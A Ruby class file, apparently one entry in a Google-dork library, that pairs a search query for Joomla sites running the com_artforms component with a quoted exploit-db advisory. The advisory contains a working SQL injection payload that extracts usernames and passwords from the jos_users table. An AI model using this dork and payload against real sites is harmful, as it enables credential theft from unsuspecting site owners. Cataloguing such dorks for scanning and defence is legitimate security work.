module Dorks
   class Dork4386 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 4386",
            ghdb_url: "https://www.exploit-db.com/ghdb/4386",
            severity: "5",
            category: "advisories_and_vulnerabilities.sqli.joomla",
            publish_date: "2017-01-23",
            author: "anonymous",
            dork: <<~EDORK,
inurl:/index.php?option=com_artforms
EDORK
            description: <<~EDESC
# Exploit Title : ----------- :Joomla "com_artforms" component SQL Injection # Author : ----------------- : importantTR # Google Dork : --------- : -inurl:/index.php?option=com_artforms # Date : -------------------- : 20/01/2017 # Platform : --------------- : Joomla ########## 1-SQL Injection ########## index.php?option=com_artforms&task=ferforms&viewform=[SQLi] ##### SQLi Parameter : /index.php?option=com_artforms&task=ferforms&viewform=-1%20UNION%20SELECT%201,concat_ws%280x4a,username,password%29,3,4,5,6%20from%20jos_users%23 ########## AYYILDIZ TIM ########## https://www.exploit-db.com/exploits/14263/
EDESC
         })

      end
   end
end
